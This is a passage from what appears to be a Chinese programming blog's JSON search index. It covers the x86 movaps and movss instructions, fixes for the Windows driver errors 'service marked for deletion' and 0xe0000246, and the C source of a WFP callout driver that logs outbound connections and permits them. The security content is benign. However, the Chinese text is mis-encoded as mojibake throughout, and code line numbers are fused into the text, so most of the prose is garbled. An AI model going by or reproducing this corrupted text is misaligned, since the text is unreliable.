movapsæ˜¯x86æŒ‡ä»¤é›†ä¸­çš„ä¸€ç§æŒ‡ä»¤ï¼Œç”¨äºå°†å¯¹é½çš„å°è£…å¥½çš„128ä½æ•°æ®ä»æºåœ°å€ç§»åŠ¨åˆ°ç›®æ ‡åœ°å€ã€‚è¿™ä¸ªæŒ‡ä»¤é€šå¸¸ç”¨äºå¤„ç†SSEï¼ˆStreaming SIMD Extensionsï¼‰å¯„å­˜å™¨ä¹‹é—´çš„æ•°æ®ä¼ é€ã€‚ åœ¨movapsæŒ‡ä»¤ä¸­ï¼Œâ€œaps&quot;è¡¨ç¤º&quot;Aligned Packed Singleâ€ï¼Œå³å¯¹é½çš„å°è£…å¥½çš„å•ç²¾åº¦æµ®ç‚¹æ•°ã€‚å®ƒè¦æ±‚æºåœ°å€å’Œç›®æ ‡åœ°å€éƒ½æ˜¯16å­—èŠ‚å¯¹é½çš„ï¼Œä»¥ç¡®ä¿æ•°æ®ä¼ é€çš„æ•ˆç‡ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸¤ä¸ªSSEå¯„å­˜å™¨xmm0å’Œxmm1ï¼Œä»¥åŠä¸€ä¸ªå†…å­˜åœ°å€addrï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤å°†xmm0ä¸­çš„æ•°æ®ç§»åŠ¨åˆ°addræ‰€æŒ‡å‘çš„å†…å­˜ä¸­ï¼š 123å¤åˆ¶ä»£ç movaps [addr], xmm0 è¿™ä¸ªæŒ‡ä»¤å°†ä¼šå°†xmm0ä¸­çš„128ä½æ•°æ®ï¼ˆå³4ä¸ªå•ç²¾åº¦æµ®ç‚¹æ•°ï¼‰å¯¹é½åœ°å­˜å‚¨åœ¨addræ‰€æŒ‡å‘çš„å†…å­˜åœ°å€ä¸­ã€‚ movss movss æ˜¯x86æŒ‡ä»¤é›†ä¸­çš„ä¸€ç§å•ç²¾åº¦ç§»åŠ¨æŒ‡ä»¤ï¼Œç”¨äºå°†å•ç²¾åº¦æµ®ç‚¹æ•°ï¼ˆ32ä½ï¼‰ä»ä¸€ä¸ªä½ç½®ç§»åŠ¨åˆ°å¦ä¸€ä¸ªä½ç½®ã€‚è¿™ä¸ªæŒ‡ä»¤å¯ä»¥ç”¨äºå¯„å­˜å™¨ä¹‹é—´ã€å­˜å‚¨å™¨å’Œå¯„å­˜å™¨ä¹‹é—´ã€å­˜å‚¨å™¨ä¹‹é—´çš„æ•°æ®ä¼ é€ã€‚","tags":[{"name":"æ±‡ç¼–","slug":"æ±‡ç¼–","permalink":"https://hodlyounger.github.io/tags/%E6%B1%87%E7%BC%96/"},{"name":"Code/æ±‡ç¼–","slug":"Code-æ±‡ç¼–","permalink":"https://hodlyounger.github.io/tags/Code-%E6%B1%87%E7%BC%96/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ±‡ç¼–","slug":"B-Code/æ±‡ç¼–","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"ã€é©±åŠ¨ã€‘æŒ‡å®šçš„æœåŠ¡å·²æ ‡è®°ä¸ºåˆ é™¤å¦‚ä½•è§£å†³","date":"2023-10-27T01:24:02.090Z","path":"A_OS/Windows/é©±åŠ¨/ã€é©±åŠ¨ã€‘æŒ‡å®šçš„æœåŠ¡å·²æ ‡è®°ä¸ºåˆ é™¤å¦‚ä½•è§£å†³/","text":"æ¦‚è¿°ï¼š windowsé©±åŠ¨å¼€å‘å¸¸è§é”™è¯¯æ•´ç†åŠå…¶è§£å†³æ€è·¯æ•´ç† [toc] 1 æŒ‡å®šçš„æœåŠ¡å·²è¢«æ ‡è®°ä¸ºåˆ é™¤ åœ¨Windowsç³»ç»Ÿä¸­ï¼Œæœ‰æ—¶å€™åœ¨å°è¯•å¯åŠ¨æˆ–åœæ­¢æœåŠ¡æ—¶ï¼Œå¯èƒ½ä¼šé‡åˆ°â€œæŒ‡å®šçš„æœåŠ¡å·²è¢«æ ‡è®°ä¸ºåˆ é™¤â€é”™è¯¯ã€‚è¿™ä¸ªé”™è¯¯å¸¸æ˜¯ç”±äºæœåŠ¡å·²è¢«åˆ é™¤ï¼Œä½†æ˜¯å…¶é…ç½®ä¿¡æ¯ä»ç„¶å­˜åœ¨äºç³»ç»Ÿä¸­æ‰€å¯¼è‡´çš„ã€‚æœ¬æ–‡å°†è¯¦ç»†è®²è§£å¦‚ä½•è§£å†³â€œæŒ‡å®šçš„æœåŠ¡å·²è¢«æ ‡è®°ä¸ºåˆ é™¤â€é”™è¯¯ï¼ŒåŒ…æ‹¬ä½¿ç”¨æ–¹æ³•å’Œç¤ºä¾‹è¯´æ˜ã€‚ è§£å†³â€œæŒ‡å®šçš„æœåŠ¡å·²è¢«æ ‡è®°ä¸ºåˆ é™¤â€é”™è¯¯ è¦è§£å†³æŒ‡å®šçš„æœåŠ¡å·²è¢«æ ‡è®°ä¸ºåˆ é™¤â€é”™è¯¯ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š æ–¹æ³•ä¸€ï¼šä½¿ç”¨å‘½ä»¤è¡Œ æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼ˆä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼‰ã€‚ è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š 1sc delete servicename å…¶ä¸­ï¼Œservicenameæ˜¯è¦åˆ é™¤çš„æœåŠ¡çš„åç§°ã€‚ æŒ‰ä¸‹å›è½¦é”®ï¼Œå¾…å‘½æ‰§è¡Œå®Œæˆã€‚ é‡æ–°å¯åŠ¨è®¡ç®—æœºã€‚ æ–¹æ³•äºŒï¼šä½¿ç”¨æ³¨å†Œè¡¨ç¼–è¾‘å™¨ æ‰“å¼€æ³¨å†Œè¡¨ç¼–è¾‘å™¨ï¼ˆä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼‰ã€‚ å¯¼èˆªåˆ°ä»¥ä¸‹è·¯å¾„ï¼š 1HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services 3.æ‰¾å¹¶åˆ é™¤è¦åˆ é™¤çš„æœåŠ¡çš„å­é¡¹ã€‚ é‡æ–°å¯åŠ¨è®¡ç®—æœºã€‚ ä½¿ç”¨ç¤ºä¾‹ ä»¥ä¸‹æ˜¯ä¸¤ä¸ªä½¿ç”¨å‘½ä»¤è¡Œå’Œæ³¨å†Œè¡¨ç¼–è¾‘å™¨è§£å†³â€œæŒ‡å®šçš„æœåŠ¡å·²è¢«æ ‡è®°ä¸ºåˆ é™¤â€é”™è¯¯çš„ç¤ºä¾‹è¯´æ˜ï¼š ä½¿ç”¨å‘½ä»¤è¡Œåˆ é™¤æœåŠ¡ï¼šå‡è®¾æˆ‘ä»¬éœ€è¦åˆ é™¤åâ€œtestserviceâ€çš„æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 1sc delete testservice è¿™æ ·å°±å¯ä»¥åˆ é™¤è¯¥æœåŠ¡ã€‚ ä½¿ç”¨æ³¨å†Œè¡¨ç¼–è¾‘å™¨åˆ é™¤æœåŠ¡ï¼šå‡è®¾æˆ‘ä»¬éœ€è¦åˆ é™¤åä¸ºâ€œtestserviceâ€çš„æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ­¥éª¤ï¼š æ‰“å¼€æ³¨å†Œè¡¨ç¼–è¾‘å™¨ã€‚ å¯¼èˆªåˆ°â€œHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Servicesâ€è·¯å¾„ã€‚ æŸ¥æ‰¾åä¸ºâ€œtestserviceâ€çš„å­é¡¹ï¼Œå¹¶åˆ é™¤è¯¥å­é¡¹ã€‚ é‡æ–°å¯åŠ¨è®¡ç®—æœºã€‚ è¿™æ ·å°±å¯ä»¥åˆ é™¤è¯¥æœåŠ¡ã€‚ æ€»ç»“ ä»¥ä¸Šæ˜¯å…³äºå¦‚ä½•è§£å†³â€œæŒ‡å®šçš„æœåŠ¡å·²è¢«æ ‡è®°ä¸ºåˆ é™¤â€é”™è¯¯çš„æ”»ç•¥ï¼ŒåŒ…æ‹¬æ–¹æ³•å’Œç¤ºä¾‹è¯´æ˜ã€‚å¦‚æœæ‚¨é‡åˆ°äº†è¿™ä¸ªé”™è¯¯ï¼Œè¯·å°è¯•ä½¿ç”¨ä»¥ä¸Šæ–¹æ³•è§£å†³ã€‚","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"é©±åŠ¨","slug":"é©±åŠ¨","permalink":"https://hodlyounger.github.io/tags/%E9%A9%B1%E5%8A%A8/"},{"name":"OS","slug":"OS","permalink":"https://hodlyounger.github.io/tags/OS/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"}]},{"title":"ã€é©±åŠ¨ã€‘å¸¸è§å®‰è£…é”™è¯¯","date":"2023-10-27T01:24:02.089Z","path":"A_OS/Windows/é©±åŠ¨/ã€é©±åŠ¨ã€‘å¸¸è§å®‰è£…é”™è¯¯/","text":"æ¦‚è¿°ï¼šå¸¸è§é©±åŠ¨å®‰è£…é”™è¯¯å·²ç»è§£å†³æ–¹æ¡ˆ å½“å‰å·²æ”¶å½•çš„é”™è¯¯è§£å†³åŠæ³• ã€é©±åŠ¨ã€‘æŒ‡å®šçš„æœåŠ¡å·²æ ‡è®°ä¸ºåˆ é™¤å¦‚ä½•è§£å†³ å®‰è£…å£°ç½‘å¡é©±åŠ¨æŠ¥é”™ï¼Œä»£ç ï¼š0xe0000246 æ‰“å¼€æ³¨å†Œè¡¨ï¼Œæ‰¾åˆ°ï¼šHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DeviceInstall\\Parameters å°†ï¼šDeviceInstallDisabled çš„å€¼æ”¹ä¸º 0 é‡æ–°å®‰è£…é©±åŠ¨å³å¯ å‚è€ƒï¼š0xe0000246è§£å†³æ–¹æ¡ˆ æ³¨å†Œè¡¨è¢«ä¿æŠ¤é—®é¢˜ https://techquack.com/how-to-fix-the-the-configuration-registry-database-is-corrupt-error/","tags":[{"name":"windows/é©±åŠ¨","slug":"windows-é©±åŠ¨","permalink":"https://hodlyounger.github.io/tags/windows-%E9%A9%B1%E5%8A%A8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"}]},{"title":"ã€é©±åŠ¨ã€‘ä¸€ä¸ªå®Œæ•´çš„wfpé©±åŠ¨","date":"2023-10-27T01:24:02.088Z","path":"A_OS/Windows/é©±åŠ¨/ã€é©±åŠ¨ã€‘ä¸€ä¸ªå®Œæ•´çš„wfpé©±åŠ¨/","text":"æ¦‚è¿°ï¼šä¸€ä¸ªå®Œæ•´çš„ WFP é©±åŠ¨ç¨‹åº 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390#include &lt;ntddk.h&gt;#pragma warning(push)#pragma warning(disable:4201) // unnamed struct/union#pragma warning(disable:4995)#include &lt;fwpsk.h&gt;#pragma warning(pop)#include &lt;ndis.h&gt;#include &lt;fwpmk.h&gt;#include &lt;limits.h&gt;#include &lt;ws2ipdef.h&gt;#include &lt;in6addr.h&gt;#include &lt;ip2string.h&gt;#include &lt;strsafe.h&gt;#define INITGUID#include &lt;guiddef.h&gt;#define bool BOOLEAN#define true TRUE #define false FALSE#define DEVICE_NAME L&quot;\\\\Device\\\\WFP_TEST&quot;#define DEVICE_DOSNAME L&quot;\\\\DosDevices\\\\WFP_TEST&quot;#define kmalloc(_s) ExAllocatePoolWithTag(NonPagedPool, _s, &#x27;SYSQ&#x27;)#define kfree(_p) ExFreePool(_p)DEFINE_GUID // &#123;6812FC83-7D3E-499a-A012-55E0D85F348B&#125;(GUID_ALE_AUTH_CONNECT_CALLOUT_V4,0x6812fc83,0x7d3e,0x499a,0xa0, 0x12, 0x55, 0xe0, 0xd8, 0x5f, 0x34, 0x8b);PDEVICE_OBJECT gDevObj;HANDLE gEngineHandle = 0;HANDLE gInjectHandle = 0;//CalloutIdUINT32 gAleConnectCalloutId = 0;//FilterIdUINT64 gAleConnectFilterId = 0;/*ä»¥ä¸‹ä¸¤ä¸ªå›è°ƒå‡½æ•°æ²¡å•¥ç”¨*/NTSTATUS NTAPI WallNotifyFn(IN FWPS_CALLOUT_NOTIFY_TYPE notifyType,IN const GUID *filterKey,IN const FWPS_FILTER *filter)&#123; KdPrint((&quot;NotifyFn\\n&quot;)); return STATUS_SUCCESS;&#125;VOID NTAPI WallFlowDeleteFn(IN UINT16 layerId,IN UINT32 calloutId,IN UINT64 flowContext)&#123; KdPrint((&quot;FlowDeleteFn\\n&quot;)); return;&#125;//åè®®ä»£ç è½¬ä¸ºåç§°char* ProtocolIdToName(UINT16 id)&#123; char *ProtocolName = kmalloc(16); RtlZeroMemory(ProtocolName,16); switch (id) &#123; case 1: strcpy_s(ProtocolName, 4 + 1, &quot;ICMP&quot;); break; case 2: strcpy_s(ProtocolName, 4 + 1, &quot;IGMP&quot;); break; case 6: strcpy_s(ProtocolName, 3 + 1, &quot;TCP&quot;); break; case 17: strcpy_s(ProtocolName, 3 + 1, &quot;UDP&quot;); break; case 27: strcpy_s(ProtocolName, 3 + 1, &quot;RDP&quot;); break; default: strcpy_s(ProtocolName, 7 + 1, &quot;UNKNOWN&quot;); break; &#125; return ProtocolName;&#125;//æœ€é‡è¦çš„è¿‡æ»¤å‡½æ•°void NTAPI WallALEConnectClassify(IN const FWPS_INCOMING_VALUES0* inFixedValues,//æ­¤ç»“æ„åŒ…å«ç­›é€‰å±‚ä¸Šæ¯ä¸ªæ•°æ®å­—æ®µçš„å€¼ //incomingValue[index] =&gt; indexçš„å€¼æ˜¯æšä¸¾ç±»å‹FWPS_FIELDS_ALE_AUTH_CONNECT_V4,//æšä¸¾åå­—è¯´æ˜äº†è¯¥å€¼çš„ç±»å‹ä¾‹å¦‚:FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_LOCAL_ADDRESS å°±æ˜¯æœ¬åœ°IP IN const FWPS_INCOMING_METADATA_VALUES0* inMetaValues,//æ­¤ç»“æ„åŒ…å«ç­›é€‰å±‚ä¸Šæ¯ä¸ªå…ƒæ•°æ®å­—æ®µçš„å€¼ã€‚IN OUT void* layerData,//æŒ‡å‘ç»“æ„çš„æŒ‡é’ˆï¼Œè¯¥ç»“æ„æè¿°æ­£åœ¨è¿‡æ»¤çš„å±‚ä¸Šçš„åŸå§‹æ•°æ®ã€‚æ­¤å‚æ•°å¯èƒ½ä¸ºNULLï¼Œ//è¿™å–å†³äºæ‰€ç­›é€‰çš„å±‚å’Œè°ƒç”¨classfyFn0æ ‡æ³¨å‡½æ•°çš„æ¡ä»¶ã€‚//å¯¹äºæµå±‚ï¼Œæ­¤å‚æ•°æŒ‡å‘FWPS_stream_Callout_IO_PACKET 0ç»“æ„ã€‚//å¯¹äºæ‰€æœ‰å…¶ä»–å±‚ï¼Œå¦‚æœNetBufferListç»“æ„ä¸æ˜¯NULLï¼Œåˆ™è¯¥å‚æ•°æŒ‡å‘è¯¥ç»“æ„ã€‚IN const void* classifyContext,//ç”±è¿‡æ»¤å™¨å¼•æ“æŒ‡å‘ä¸æ ‡æ³¨é©±åŠ¨ç¨‹åºå…³è”çš„ä¸Šä¸‹æ–‡æ•°æ®çš„æŒ‡é’ˆ æ²¡æœ‰æ‰¾å‡ºè¯¥æŒ‡é’ˆç±»å‹IN const FWPS_FILTER* filter,//æŒ‡å‘FWPS_FILTER1ç»“æ„çš„æŒ‡é’ˆã€‚æ­¤ç»“æ„æè¿°æŒ‡å®šç­›é€‰å™¨æ“ä½œçš„æ ‡æ³¨çš„ç­›é€‰å™¨ã€‚IN UINT64 flowContext,//åŒ…å«ä¸æ•°æ®æµå…³è”çš„ä¸Šä¸‹æ–‡çš„UINT 64ç±»å‹å˜é‡ã€‚å¦‚æœæ²¡æœ‰ä¸æ•°æ®æµç›¸å…³è”çš„ä¸Šä¸‹æ–‡ï¼Œåˆ™æ­¤å‚æ•°ä¸ºé›¶ã€‚//å¦‚æœåœ¨ä¸æ”¯æŒæ•°æ®æµçš„è¿‡æ»¤å±‚å°†æ ‡æ³¨æ·»åŠ åˆ°ç­›é€‰å¼•æ“ä¸­ï¼Œåˆ™clamfyFn1å›è°ƒå‡½æ•°åº”å¿½ç•¥æ­¤å‚æ•°OUT FWPS_CLASSIFY_OUT* classifyOut //æŒ‡å‘FWPS_GARGY_OUT 0ç»“æ„çš„æŒ‡é’ˆï¼Œè¯¥ç»“æ„æ¥æ”¶clamfyFn1å›è°ƒå‡½æ•°è¿”å›ç»™è°ƒç”¨æ–¹çš„ä»»ä½•æ•°æ®)&#123; char *ProtocolName = NULL; DWORD LocalIp, RemoteIP; PWCHAR Path = NULL; do &#123; Path = ExAllocatePoolWithTag(NonPagedPool, inMetaValues-&gt;processPath-&gt;size+2, &#x27;NET&#x27;); if (NULL==Path) &#123; break; &#125; RtlZeroMemory(Path, inMetaValues-&gt;processPath-&gt;size + 2); wcscpy_s(Path, inMetaValues-&gt;processPath-&gt;size / 2, (WCHAR*)inMetaValues-&gt;processPath-&gt;data); LocalIp = inFixedValues-&gt;incomingValue[FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_LOCAL_ADDRESS].value.uint32; RemoteIP = inFixedValues-&gt;incomingValue[FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_REMOTE_ADDRESS].value.uint32; ProtocolName = ProtocolIdToName(inFixedValues-&gt;incomingValue[FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_PROTOCOL].value.uint16); DbgPrint(&quot;è¿›ç¨‹ID : %d&quot;, (DWORD)(inMetaValues-&gt;processId)); DbgPrint(&quot;Path=%S&quot;, Path); DbgPrint(&quot;æœ¬åœ°åœ°å€=%u.%u.%u.%u &quot;, (LocalIp &gt;&gt; 24) &amp; 0xFF, (LocalIp &gt;&gt; 16) &amp; 0xFF, (LocalIp &gt;&gt; 8) &amp; 0xFF, LocalIp &amp; 0xFF); DbgPrint(&quot;ç«¯å£%d\\n&quot;, inFixedValues-&gt;incomingValue[FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_LOCAL_PORT].value.uint16); DbgPrint(&quot;è¿œç¨‹åœ°å€=%u.%u.%u.%u &quot;, (RemoteIP &gt;&gt; 24) &amp; 0xFF, (RemoteIP &gt;&gt; 16) &amp; 0xFF, (RemoteIP &gt;&gt; 8) &amp; 0xFF, RemoteIP &amp; 0xFF); DbgPrint(&quot;ç«¯å£%d\\n&quot;, inFixedValues-&gt;incomingValue[FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_REMOTE_PORT].value.uint16); DbgPrint(&quot;åè®®å: %s\\n&quot;, ProtocolName); kfree(ProtocolName); &#125; while (0); if (NULL != Path) &#123; ExFreePoolWithTag(Path, &#x27;NET&#x27;); &#125; classifyOut-&gt;actionType = FWP_ACTION_PERMIT;//å…è®¸è¿æ¥ return;&#125;NTSTATUS RegisterCalloutForLayer(IN const GUID* layerKey,IN const GUID* calloutKey,IN FWPS_CALLOUT_CLASSIFY_FN classifyFn,IN FWPS_CALLOUT_NOTIFY_FN notifyFn,IN FWPS_CALLOUT_FLOW_DELETE_NOTIFY_FN flowDeleteNotifyFn,OUT UINT32* calloutId, //æ³¨å†Œcalloutæ—¶è¿”å›æ­¤IDOUT UINT64* filterId)&#123; NTSTATUS status = STATUS_SUCCESS; FWPS_CALLOUT sCallout = &#123; 0 &#125;; FWPM_FILTER mFilter = &#123; 0 &#125;; FWPM_FILTER_CONDITION mFilter_condition[1] = &#123; 0 &#125;; FWPM_CALLOUT mCallout = &#123; 0 &#125;; FWPM_DISPLAY_DATA mDispData = &#123; 0 &#125;; BOOLEAN bCalloutRegistered = FALSE; //è¿™é‡ŒæœªæŒ‡å®šsCallout.flags sCallout.calloutKey = *calloutKey; //ä¸€ä¸ªå”¯ä¸€çš„GUIDå€¼,ç”¨æ¥æ ‡è®°æ­¤callout sCallout.classifyFn = classifyFn; //æ¯å½“å›è°ƒå¤„ç†ç½‘ç»œæ•°æ®æ—¶ï¼Œè¿‡æ»¤å™¨å¼•æ“å°†è°ƒç”¨æ­¤å‡½æ•°,å¤„ç†ç½‘ç»œæ•°æ®åœ¨è¿™ä¸ªå›è°ƒå‡½æ•°é‡Œé¢å¤„ç†. sCallout.flowDeleteFn = flowDeleteNotifyFn; //æ¯å½“ç»ˆæ­¢ç”±å›è°ƒå¤„ç†çš„æ•°æ®æµæ—¶ï¼Œç­›é€‰å™¨å¼•æ“å°†è°ƒç”¨æ­¤å‡½æ•° sCallout.notifyFn = notifyFn; //å¸è½½calloutæ—¶,ä¼šè°ƒç”¨è¿™ä¸ªå›è°ƒ //è¦ä½¿ç”¨å“ªä¸ªè®¾å¤‡å¯¹è±¡æ³¨å†Œ status = FwpsCalloutRegister(gDevObj, //è‡ªå·±åˆ›å»ºçš„è®¾å¤‡å¯¹è±¡ &amp;sCallout, //è¯¥ç»“æ„ä½“æœ‰ç”¨çš„æ˜¯æŒ‡å®šäº†classifyFnå›è°ƒ,å¤„ç†è¿æ¥æ—¶çš„æ•°æ®å°±ä¼šç”¨åˆ°è¿™ä¸ªå›è°ƒå‡½æ•°. calloutId //è¿”å›çš„calloutID ,å–æ¶ˆæ³¨å†Œcalloutä¼šç”¨åˆ°è¿™ä¸ªå€¼ ); if (!NT_SUCCESS(status)) goto exit; bCalloutRegistered = TRUE; mDispData.name = L&quot;WFP TEST&quot;; //å¯é€‰çš„åå­— mDispData.description = L&quot;yxp&#x27;s WFP TEST&quot;; //å¯é€‰çš„æè¿° //ä½ æ„Ÿå…´è¶£çš„å†…å®¹ mCallout.applicableLayer = *layerKey; //è¿‡æ»¤å±‚æ ‡è¯†ç¬¦ æ­¤è¿‡æ»¤å±‚å…è®¸æˆæƒå¯¹ä¼ å‡ºtcpè¿æ¥çš„è¿æ¥è¯·æ±‚ï¼Œ //ä»¥åŠåŸºäºå‘é€çš„ç¬¬ä¸€ä¸ªæ•°æ®åŒ…æˆæƒä¼ å‡ºétcpé€šä¿¡é‡ //ä½ æ„Ÿå…´è¶£çš„å†…å®¹çš„GUID mCallout.calloutKey = *calloutKey; //è¯¥GUIDå€¼å¿…é¡»ä¸FwpsCalloutRegisteræ³¨å†Œæ—¶çš„GUIDå€¼ç›¸åŒ. mCallout.displayData = mDispData; //å‘è¿‡æ»¤å¼•æ“æ·»åŠ callout status = FwpmCalloutAdd(gEngineHandle, &amp;mCallout, //flagsæ²¡æœ‰è®¾ç½® NULL, //å®‰å…¨æè¿°ç¬¦ å¯ä»¥ä¸ºNULL NULL); //è¿”å›ä¸€ä¸ªID ä¸FwpsCalloutRegisterå‡½æ•°è¿”å›çš„IDæ˜¯ç›¸åŒçš„. if (!NT_SUCCESS(status)) goto exit; //FWPM_action0ç»“æ„æŒ‡å®šåœ¨æ‰€æœ‰ç­›é€‰æ¡ä»¶éƒ½ä¸ºçœŸæ—¶æ‰€é‡‡å–çš„æ“ä½œ mFilter.action.calloutKey = *calloutKey; //äº¤ç»™calloutå¤„ç† ç”±calloutæ¥å†³å®šè¿”å›é˜»æ­¢(block)æˆ–è€…å…è®¸(permit) mFilter.action.type = FWP_ACTION_CALLOUT_TERMINATING; //æè¿° mFilter.displayData.name = L&quot;WFP TEST&quot;; mFilter.displayData.description = L&quot;yxp&#x27;s WFP TEST&quot;; mFilter.layerKey = *layerKey; //è¿™ä¸ªå€¼å’ŒFwpmCalloutAddé‡Œé¢ä½¿ç”¨çš„å€¼ä¸€æ · è¿‡æ»¤å±‚æ ‡è¯†ç¬¦ æ­¤è¿‡æ»¤å±‚å…è®¸æˆæƒå¯¹ä¼ å‡ºtcpè¿æ¥çš„è¿æ¥è¯·æ±‚ï¼Œ //ä»¥åŠåŸºäºå‘é€çš„ç¬¬ä¸€ä¸ªæ•°æ®åŒ…æˆæƒä¼ å‡ºétcpé€šä¿¡é‡ //è¿‡æ»¤æ¡ä»¶æ•° mFilter.numFilterConditions = 0; //è¿‡æ»¤æ¡ä»¶ mFilter.filterCondition = mFilter_condition; mFilter.subLayerKey = FWPM_SUBLAYER_UNIVERSAL; //æ­¤å­å±‚æ‰¿è½½æ‰€æœ‰æœªåˆ†é…ç»™ä»»ä½•å…¶ä»–å­å±‚çš„ç­›é€‰å™¨ //BFEå°†æ ¹æ®è¿‡æ»¤æ¡ä»¶è‡ªåŠ¨åˆ†é…æƒé‡ mFilter.weight.type = FWP_EMPTY; //æ·»åŠ ä¸€ä¸ªæ–°çš„è¿‡æ»¤å™¨å¯¹è±¡åˆ°ç³»ç»Ÿä¸­ status = FwpmFilterAdd(gEngineHandle, &amp;mFilter, NULL, filterId); if (!NT_SUCCESS(status)) goto exit;exit: if (!NT_SUCCESS(status)) &#123; if (bCalloutRegistered) &#123; FwpsCalloutUnregisterById(*calloutId); &#125; &#125; return status;&#125;NTSTATUS WallRegisterCallouts()&#123; NTSTATUS status = STATUS_SUCCESS; BOOLEAN bInTransaction = FALSE; BOOLEAN bEngineOpened = FALSE; FWPM_SESSION session = &#123; 0 &#125;; //ç½®æ­¤æ ‡å¿—æ—¶ï¼Œä¼šè¯ç»“æŸæ—¶å°†è‡ªåŠ¨åˆ é™¤åœ¨ä¼šè¯æœŸé—´æ·»åŠ çš„ä»»ä½•å¯¹è±¡ session.flags = FWPM_SESSION_FLAG_DYNAMIC; //å¼€å¯WFPå¼•æ“ status = FwpmEngineOpen(NULL, RPC_C_AUTHN_WINNT, NULL, &amp;session, &amp;gEngineHandle); if (!NT_SUCCESS(status)) goto exit; bEngineOpened = TRUE; // åœ¨å½“å‰ä¼šè¯ä¸­å¼€å§‹æ˜¾å¼äº‹åŠ¡ status = FwpmTransactionBegin(gEngineHandle, 0); if (!NT_SUCCESS(status)) goto exit; bInTransaction = TRUE; //æ³¨å†Œå›è°ƒå‡½æ•° status = RegisterCalloutForLayer( &amp;FWPM_LAYER_ALE_AUTH_CONNECT_V4, //æ­¤è¿‡æ»¤å±‚å…è®¸æˆæƒå¯¹ä¼ å‡ºtcpè¿æ¥çš„è¿æ¥è¯·æ±‚ï¼Œ //ä»¥åŠåŸºäºå‘é€çš„ç¬¬ä¸€ä¸ªæ•°æ®åŒ…æˆæƒä¼ å‡ºétcpé€šä¿¡é‡ &amp;GUID_ALE_AUTH_CONNECT_CALLOUT_V4, WallALEConnectClassify, WallNotifyFn, WallFlowDeleteFn, &amp;gAleConnectCalloutId, &amp;gAleConnectFilterId); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;RegisterCalloutForLayerå¤±è´¥!\\n&quot;); goto exit; &#125; //ç¡®è®¤æ‰€æœ‰å†…å®¹å¹¶æäº¤ï¼Œè®©å›è°ƒå‡½æ•°æ­£å¼å‘æŒ¥ä½œç”¨ status = FwpmTransactionCommit(gEngineHandle); if (!NT_SUCCESS(status)) goto exit; bInTransaction = FALSE;exit: if (!NT_SUCCESS(status)) &#123; if (bInTransaction) &#123; FwpmTransactionAbort(gEngineHandle); &#125; if (bEngineOpened) &#123; FwpmEngineClose(gEngineHandle); gEngineHandle = 0; &#125; &#125; return status;&#125;NTSTATUS WallUnRegisterCallouts()&#123; if (gEngineHandle != 0) &#123; //åˆ é™¤FilterId FwpmFilterDeleteById(gEngineHandle, gAleConnectFilterId); //åˆ é™¤CalloutId FwpmCalloutDeleteById(gEngineHandle, gAleConnectCalloutId); //æ¸…ç©ºFilterId gAleConnectFilterId = 0; //åæ³¨å†ŒCalloutId FwpsCalloutUnregisterById(gAleConnectCalloutId); //æ¸…ç©ºCalloutId gAleConnectCalloutId = 0; //å…³é—­å¼•æ“ FwpmEngineClose(gEngineHandle); gEngineHandle = 0; &#125; return STATUS_SUCCESS;&#125;VOID DriverUnload(PDRIVER_OBJECT driverObject)&#123; NTSTATUS status; UNICODE_STRING deviceDosName = &#123; 0 &#125;; status = WallUnRegisterCallouts(); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;WallUnRegisterCalloutså¤±è´¥\\n&quot;); return; &#125; RtlInitUnicodeString(&amp;deviceDosName, DEVICE_DOSNAME); IoDeleteSymbolicLink(&amp;deviceDosName); if (gDevObj) &#123; IoDeleteDevice(gDevObj); gDevObj = NULL; &#125; 